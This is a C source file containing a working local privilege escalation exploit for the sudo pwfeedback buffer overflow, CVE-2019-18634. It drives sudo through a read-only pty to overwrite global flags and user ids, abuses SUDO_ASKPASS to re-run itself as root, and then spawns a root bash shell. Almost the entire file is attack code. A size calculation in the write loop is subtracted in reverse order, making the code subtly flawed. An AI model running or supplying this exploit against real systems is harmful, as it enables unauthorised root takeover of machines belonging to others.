/**
 * CVE-2019-18634 sudo pwfeedback: buffer overflow exploit LPE
 *
 * Target: sudo 1.8.25 on Ubuntu 20.04
*/

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <error.h>
#include <errno.h>
#include <unistd.h>
#include <string.h>
#include <termios.h>
#include <limits.h>

#define log(...) printf("[+] " __VA_ARGS__)
#define err(...) do {                  \
	printf("[-] " __VA_ARGS__);        \
	printf(": %s\n", strerror(errno)); \
	exit(EXIT_FAILURE);                \
} while(0)

#define TGP_ASKPASS 4
#define SUDO_BUF_SIZE 256
#define OFFSET_TGETPASS_FLAGS 0x224
#define OFFSET_USERDETAILS_UID 0x254
#define SUDO_TERM_KILL "\x15"

/**
 * create_pty: creates a pseudo-terminal
 *
 * It opens the pseudo-terminal, disables special processing and echoing,
 * opens the slave end as read-only, and writes both master and slave file
 * descriptors into `master_ptr` and `slave_ptr`
*/
void create_pty(int* master_ptr, int* slave_ptr) {
	log("Creating pty\n");

	// Open pty
	int master = posix_openpt(O_NOCTTY | O_RDWR);
	if (master == -1)
		err("posix_openpt");

	if (grantpt(master) == -1)
		err("grantpt");

	if (unlockpt(master) == -1)
		err("unlockpt");

	// Make it raw
	struct termios term;
	if (tcgetattr(master, &term) == -1)
		err("tcgetattr");
	cfmakeraw(&term);
	if (tcsetattr(master, TCSANOW, &term) == -1)
		err("tcsetattr");

	char* slave_name = ptsname(master);
	if (slave_name == NULL)
		err("ptsname");

	// Open slave with O_RDONLY, so sudo fails to write to it
	int slave = open(slave_name, O_NOCTTY | O_RDONLY);
	if (slave == -1)
		err("open slave");

	*master_ptr = master;
	*slave_ptr  = slave;
}

/**
 * write_payload: creates and writes the payload to the master end of the pty
 *
 * This payload will overflow the variable `buf`, which is a static variable.
 * This allows us to overwrite some global variables. We set `tgetpass_flags`
 * to TGP_ASKPASS, and `uid`, `euid`, `gid` and `egid` from `user_details` to 0.
 * That way, when authentication fails, sudo will try to ask for a password
 * again, invoking the program indicated by the env SUDO_ASKPASS as root.
 *
 * In order to achieve the overflow, we write a SUDO_TERM_KILL character every
 * SUDO_BUF_SIZE - 2 bytes of our payload. Sudo can read up to SUDO_BUF_SIZE - 1
 * bytes, as the last byte will be a null byte. The bug happens when it reads
 * SUDO_TERM_KILL. It will try to write to `slave`, which was opened as
 * read-only, so it will fail, and it will reset the count of read bytes to 0.
 * So we just fill the buffer, send the cursed character, overflow and repeat!
*/
void write_payload(int master) {
	// Create payload
	unsigned char payload[OFFSET_USERDETAILS_UID+16];
	memset(payload, 0, sizeof(payload));
	payload[OFFSET_TGETPASS_FLAGS] = TGP_ASKPASS;

	// Write payload
	log("Writing payload\n");
	size_t written = 0;
	while (written < sizeof(payload)) {
		size_t to_write = written - sizeof(payload);
		if (to_write > SUDO_BUF_SIZE - 2)
			to_write = SUDO_BUF_SIZE - 2;
		write(master, payload + written, to_write);
		write(master, SUDO_TERM_KILL, 1);
		written += to_write;
	}
	write(master, "\n", 1);
}

/**
 * run_sudo: run sudo and hope we get root
 *
 * First, it sets the env variable SUDO_ASKPASS with our path, so we will be
 * invoked as root once the overflow happens and sudo tries to ask for a
 * password again. Then, it sets the slave end of the pty as stdin so sudo
 * reads the payload written before to the master end. Finally, it runs sudo.
*/
void run_sudo(int slave) {
	// Set env SUDO_ASKPASS to our path
	char path[PATH_MAX + 1];
	int len = readlink("/proc/self/exe", path, sizeof(path) - 1);
	if (len == -1)
		err("readlink");
	path[len] = 0;
	if (setenv("SUDO_ASKPASS", path, 1) == -1)
		err("setenv");

	// Set slave as stdin for sudo
	if (dup2(slave, STDIN_FILENO) == -1)
		err("dup2");
	if (close(slave) == -1)
		err("close");

	// Run sudo
	log("Running sudo\n");
	execl("/usr/local/bin/sudo", "sudo", "-k", "-S", "id", NULL);
	err("exec");
}

/**
 * profit: you can guess what this is
 *
 * Spawns a shell once we are invoked as root.
*/
void profit() {
	// Get our stdin back, as we replaced it with the slave end of the pty
	dup2(STDERR_FILENO, STDIN_FILENO);

	// `sudo_askpass` replaces stdout with a pipe before invoking us.
	// Since we don't want to speak with sudo anymore, get our stdout back too
	dup2(STDERR_FILENO, STDOUT_FILENO);

	log("Success!\n");
	uid_t uid = getuid();
	if (uid != 0)
		err("uid: %u", uid);

	log("Invoking shell with uid = %u\n", uid);
	execl("/bin/bash", "bash", NULL);
}


int main(int argc, char** argv) {
	if (argc > 1) {
		profit();
	}

	printf("=={ CVE-2019-18634 sudo pwfeedback: buffer overflow exploit LPE }==\n");

	int master, slave;
	create_pty(&master, &slave);
	write_payload(master);
	run_sudo(slave);
}